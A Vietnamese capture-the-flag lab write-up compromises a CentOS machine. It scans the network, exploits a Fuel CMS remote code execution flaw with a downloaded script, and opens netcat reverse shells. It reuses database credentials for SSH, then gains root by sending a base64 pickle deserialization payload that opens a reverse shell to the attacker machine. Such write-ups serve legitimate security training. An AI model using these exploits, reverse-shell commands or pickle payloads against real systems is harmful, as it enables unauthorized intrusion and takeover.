
# LAB7
## Chuẩn bị
* máy Kali có ip 192.168.123.129
![image](https://user-images.githubusercontent.com/91528234/222870452-c8086395-1e63-4e7e-845e-23f61bd7fce3.png)
* Máy nạn nhân CentOS chưa có xác định ip
![image](https://user-images.githubusercontent.com/91528234/222870470-0075e7a7-e1b4-44bf-bfc7-4979a946930d.png)
## Xác định ip nạn nhân
```
netdiscover -i eth0 -r 192.168.123.0/24
```
![Screenshot from 2023-03-04 09-15-39](https://user-images.githubusercontent.com/91528234/222870529-d389e665-e60b-4dbc-bca7-7a8d463f1d4a.png)
* Quét được cổng của nạn nhân có ip `192.168.123.128`
* Vào web với ip `192.168.123.128`

![image](https://user-images.githubusercontent.com/91528234/222870957-d2f4257f-6d8b-4d9c-a1d5-679abe184850.png)
## Xác định cổng mở
```
nmap -T4 -sC -sV -p- --min-rate=1000 192.168.123.128 -oN phineas.nmap
```
![image](https://user-images.githubusercontent.com/91528234/222871241-c2c47695-99cc-46ac-a709-197519cb7f75.png)
* Từ ảnh chụp màn hình ở trên, chúng tôi nhận thấy rằng chúng tôi có các dịch vụ http và mysql bị lộ.
## Liệt kê máy chủ web
* Tiếp theo, tôi đã thử liệt kê thư mục trên máy chủ web.
```
gobuster dir -u http://192.168.123.128 -x txt,php,html --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
````
![image](https://user-images.githubusercontent.com/91528234/222872528-a76e5a6d-a389-4400-abbc-a637a67b788e.png)
* Tôi đã mở đường dẫn trên trình duyệt của mình để liệt kê thêm và không có gì quan trọng.
![image](https://user-images.githubusercontent.com/91528234/222872574-39c0929a-4e52-4ccb-a184-1e5bee97f204.png)
* Vì vậy, tôi đã phải chạy lại gobuster cho đường dẫn này.
```
gobuster dir -u http://192.168.123.128/structure -x txt,php,html --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
![image](https://user-images.githubusercontent.com/91528234/222872654-dd8222ad-5466-45a6-b702-195a898069c3.png)
* Với một chút nghiên cứu về các thư mục khác nhau và cấu trúc của dự án, tôi biết rằng điều này có cài đặt Fuel CMS. Tuy nhiên, khi tôi cố mở nó trên trình duyệt, tôi không nhận được trang chủ Fuel CMS.
![image](https://user-images.githubusercontent.com/91528234/222872732-12d86312-4e57-4273-b5a3-5fc9da10b114.png)
* Vì vậy, tôi đã cố gắng thêm/nhiên liệu vào tất cả các đường dẫn mà chúng tôi biết trong đường dẫn/cấu trúc. Ở lần thử đầu tiên, tôi đã nhận được url chính xác là `/struct/index.php/fuel`.
![image](https://user-images.githubusercontent.com/91528234/222872789-acb481cd-d40e-4865-ba84-c64a8797f422.png)
* Fuel CMS có lỗ hổng thực thi mã từ xa chưa được xác thực. Trong db khai thác, có hai ID cho cùng một khai thác. Vì python 2 không được dùng nữa nên phiên bản mới hơn được viết bằng ruby. Tuy nhiên, điều đó không hiệu quả với tôi. Mặc dù tôi đã có python 2 trên kali linux của mình, nhưng tôi quyết định cải thiện mã cho python 3. Đúng là hệ điều hành vẹt không cài đặt sẵn python 2. 
* Link to the gist: https://gist.github.com/kriss-u/8e1b44b1f4e393cf0d8a69117227dbd2
* Sửa ip đi nhé :3
![image](https://user-images.githubusercontent.com/91528234/222872988-ede2a434-9ded-4b97-908e-719ec85c5395.png)
* Mã gốc đã sử dụng burpsuite làm proxy. Do đó, tôi quyết định loại bỏ nó. Tương tự như vậy, tôi đã xóa một số thẻ html bổ sung khỏi báo cáo in.
```
wget https://gist.githubusercontent.com/kriss-u/8e1b44b1f4e393cf0d8a69117227dbd2/raw/4419f8dc7090a41c7ebc96048daf67c43c1996a3/exploit.py
```
```
python3 exploit.py
```
![image](https://user-images.githubusercontent.com/91528234/222873127-2dd862c7-e768-4208-8e52-6d3f01b0ea5c.png)
* Bây giờ, chúng ta có thể chạy bất kỳ lệnh nào giống như linux shell. Tuy nhiên, thật tốt khi có một lớp vỏ ngược phù hợp. Mục tiêu đã cài đặt netcat. Do đó, tôi đã nghe trên cổng 4444.
```
nc -nlvp 4444
```
* Trên mục tiêu
```
which nc
nc 10.0.2.15 4444 -e /bin/bash
```
![image](https://user-images.githubusercontent.com/91528234/222873578-9a74c8a9-f553-459e-8639-aac3b58ea912.png)
* Cuối cùng, tôi đã có một vỏ ngược. Tôi đã cố gắng để có được một cái vỏ thích hợp, tuy nhiên, tôi đã không gặp may. Vì vậy, tôi quyết định tìm kiếm thông tin đăng nhập. Tôi đã tìm thấy thông tin đăng nhập cơ sở dữ liệu trong / Fuel/application/config/database.php
![image](https://user-images.githubusercontent.com/91528234/222873691-e7082cb3-2abb-42b4-8d2f-8c1e5c29dc08.png)
* Bây giờ chúng tôi đã biết mật khẩu, chúng tôi cũng có thể thử mật khẩu này trên SSH. Khi tôi cố gắng SSH với tư cách là người dùng anna bằng mật khẩu, tôi đã thành công.
![image](https://user-images.githubusercontent.com/91528234/222873878-6d7bd6bd-5be3-430a-99e4-0e6a6c0c55da.png)
* Cướp cờ
![image](https://user-images.githubusercontent.com/91528234/222873916-bcb54960-07c0-461b-a703-0c938caaeb08.png)
## Nhận đặc quyền root
* Vì tôi có quyền truy cập vào anna, tôi đã xem các thư mục của cô ấy. Có một thư mục thú vị 'web' có mã dễ bị khai thác deserialization.

```
cat web/app.py
```
![image](https://user-images.githubusercontent.com/91528234/222874032-754415b3-bb32-48ba-87a9-80338c3f3f4e.png)
* Trong đoạn cắt ở trên, chúng ta có thể thấy rằng có một tham số POST 'awesome' có dữ liệu được tải bởi bộ chọn mô-đun. Đây là lỗ hổng khiến nó không kiểm tra loại dữ liệu nào có thể được gửi qua đường POST ‘/heaven’.
* Theo mặc định, một ứng dụng bình chạy trên cổng 5000. Vì vậy, tôi đã xác nhận điều này trước.
```
netstat -tnlp
```
![image](https://user-images.githubusercontent.com/91528234/222874112-6105558a-66fb-43a8-91df-99fb0baca8e5.png)
* Có rất nhiều tài nguyên có sẵn liên quan đến vấn đề khử lưu huỳnh không an toàn trên internet. Tuy nhiên, đối với tải trọng, tôi đã tìm thấy ý chính sau và sửa đổi nó cho phù hợp với python 3.
* For python 3: https://gist.github.com/kriss-u/085569495cb930e398759c0cbf45e3b7
![image](https://user-images.githubusercontent.com/91528234/222874279-9669831f-d71c-4d33-81a7-b85c9a77202b.png)
* Tôi bắt đầu nghe trên cổng 9999.
```
nc -nlvp 9999
```
* Sau đó, tôi chỉ cần chạy POST dữ liệu bằng CURL. Ngoài ra, bạn có thể chuyển cổng tới máy cục bộ của mình. Nhưng tại sao phải làm gì nếu chúng ta có curl trong máy mục tiêu.
```
curl -d "awesome=gASVPwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCRuYyAxOTIuMTY4LjEyMy4xMjkgOTk5OSAtZSAvYmluL2Jhc2iUhZRSlC4=" -X POST http://127.0.0.1:5000/heaven
```
![image](https://user-images.githubusercontent.com/91528234/222874955-5063f5de-8ad1-4db9-bf85-d718226d32dd.png)
* Và, theo cách này, chúng ta có được lớp vỏ ngược của gốc. Bây giờ, đây là lúc để có được lá cờ.
```
export TERM=xterm
python3 -c 'import pty;pty.spawn("/bin/bash")'
cd /root
ls -al
cat root.txt
```
![image](https://user-images.githubusercontent.com/91528234/222875013-379435b0-3d3f-4c72-bfa1-95a2f018b2f3.png)



